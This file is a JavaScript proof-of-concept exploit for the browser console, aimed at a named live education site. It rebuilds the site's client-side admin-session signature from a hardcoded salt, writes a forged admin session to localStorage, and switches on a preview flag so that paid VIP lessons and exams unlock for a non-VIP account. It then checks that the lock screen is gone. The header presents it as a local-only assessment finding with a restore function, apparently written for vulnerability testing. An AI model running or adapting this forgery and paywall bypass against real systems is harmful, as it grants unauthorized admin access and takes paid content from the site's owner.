// poc_new15_admin_preview.js — NEW-15: admin preview "unlock all" bypasses
//                                every VIP package gate
//                                (ACTION — enables the preview and verifies)
//
// Target:  https://trithuc500.vercel.app/
// Finding:  NEW-15 — three gates short-circuit to `true` when
//           `state.isAdminLoggedIn && state.adminPreviewUnlockAll`:
//             - hasStudentVipAccess()          (line 4121)
//             - hasVerifiedPackageAccess()     (line 10566)
//             - verifyProtectedVipActionV44()  (line 10635)
//           The flag is toggled by `window.TRITHUC.toggleAdminPreviewUnlockAll()`
//           (line 17005) and is not bound to any server-issued grant. A
//           non-VIP account therefore receives full package access.
//
// Type:     ACTION. Forges the admin session (same technique as F-02), turns
//           the preview flag on, and verifies the effect.
//
// SCOPE / SAFETY:
//   - LOCAL ONLY. The preview flag lives in the in-memory `state` of this
//     tab and is never published.
//   - It does NOT touch ntfy/KV and does NOT modify any real account.
//   - `__AERO_NEW15_RESTORE__()` reverts.
//
// Usage: paste into DevTools Console on the target page, then F5.

(async () => {
    'use strict';

    const K_SESSION = 'TRITHUC50_REMEMBER_ADMIN_SESSION_V26';
    const K_BACKUP = 'TRITHUC50_AERO_NEW15_BACKUP';

    function hashStringHex(rawStr) {
        const str = String(rawStr || '');
        let h1 = 0x811c9dc5, h2 = 0x1b873593;
        for (let i = 0; i < str.length; i++) {
            const c = str.charCodeAt(i);
            h1 = Math.imul(h1 ^ c, 16777619);
            h2 = Math.imul(h2 ^ c, 2246822507);
        }
        const p1 = (h1 >>> 0).toString(16).toUpperCase().padStart(6, '0').slice(-4);
        const p2 = (h2 >>> 0).toString(16).toUpperCase().padStart(6, '0').slice(-4);
        return p1 + p2;
    }
    function computeAdminSessionSig(username, ts) {
        const raw = `ADM_SESS|${String(username || '').toLowerCase()}|${ts || 0}|TRITHUC50_ADM_SALT_V27`;
        return 'adm_' + hashStringHex(raw);
    }

    console.log('=== NEW-15 admin preview unlock-all (ACTION, LOCAL ONLY) ===');

    if (localStorage.getItem(K_BACKUP)) {
        return console.warn('[NEW-15] already active. Run __AERO_NEW15_RESTORE__() first.');
    }
    const prevSession = localStorage.getItem(K_SESSION);
    localStorage.setItem(K_BACKUP, JSON.stringify({ session: prevSession, at: Date.now() }));

    const ts = Date.now();
    localStorage.setItem(K_SESSION, JSON.stringify({
        loggedIn: true, username: 'admin', ts, sig: computeAdminSessionSig('admin', ts)
    }));

    // Action chain: enable the preview flag, then verify the gate behaviour.
    window.__AERO_NEW15_CHAIN__ = async function () {
        const T = window.TRITHUC;
        const out = {};

        // 1. Flip the preview flag through the app's own control.
        try {
            if (T && typeof T.toggleAdminPreviewUnlockAll === 'function') {
                T.toggleAdminPreviewUnlockAll();
                out.toggleCalled = true;
            } else {
                out.toggleCalled = false;
                out.toggleError = 'window.TRITHUC.toggleAdminPreviewUnlockAll is unavailable';
            }
        } catch (e) { out.toggleCalled = false; out.toggleError = e.message; }

        // 2. Confirm the flag is reflected in the UI.
        const bodyText = document.body.innerText || '';
        out.previewBannerVisible = /Đang bật Xem thử Mở khóa toàn bộ/i.test(bodyText);
        out.viewingAsStudentLabel = /Xem theo Khóa HS|Mở khóa thử/i.test(bodyText);

        // 3. Open a protected lesson / exam and see whether the lock screen is
        //    replaced by real content. This is the user-visible payoff.
        let clicked = null;
        try {
            const cand = Array.from(document.querySelectorAll('button, [onclick]'))
                .filter(b => b.offsetParent !== null)
                .find(b => /mở khóa|mở khoá|unlock|VIP/i.test(b.textContent || ''));
            if (cand) {
                clicked = (cand.textContent || '').trim().slice(0, 60);
                cand.click();
            }
        } catch (e) { /* ignore */ }
        out.clicked = clicked || '(no visible locked-content control found)';

        // 4. Look for the locked-content modal after the click.
        await new Promise(r => setTimeout(r, 800));
        const after = document.body.innerText || '';
        out.lockModalStillShown = /BẠN CHƯA MUA|chưa kích hoạt VIP|KHÓA VIP/i.test(after);
        out.vipBadgeShown = /Trọn đời|Vĩnh viễn/i.test(after);

        console.table(out);
        const verdict = (out.toggleCalled && !out.lockModalStillShown)
            ? 'NEW-15 CONFIRMED: preview mode removed the VIP lock for a non-VIP account'
            : 'NEW-15 partially observed — inspect the table';
        console.log('[NEW-15]', verdict);
        return { ...out, verdict };
    };

    setTimeout(() => { if (typeof window.__AERO_NEW15_CHAIN__ === 'function') window.__AERO_NEW15_CHAIN__(); }, 2500);

    window.__AERO_NEW15_RESTORE__ = function () {
        const b = localStorage.getItem(K_BACKUP);
        if (!b) return console.warn('[NEW-15] no backup');
        const saved = JSON.parse(b);
        if (saved.session === null) localStorage.removeItem(K_SESSION);
        else localStorage.setItem(K_SESSION, saved.session);
        localStorage.removeItem(K_BACKUP);
        delete window.__AERO_NEW15_RESTORE__;
        delete window.__AERO_NEW15_CHAIN__;
        console.log('[NEW-15] original state restored. Press F5.');
        return true;
    };

    console.log('[NEW-15] admin session written. Press F5 — the chain runs automatically.');
    console.log('Restore: __AERO_NEW15_RESTORE__() then F5');

    return { ok: true, scope: 'LOCAL ONLY — in-memory preview flag in this tab' };
})();
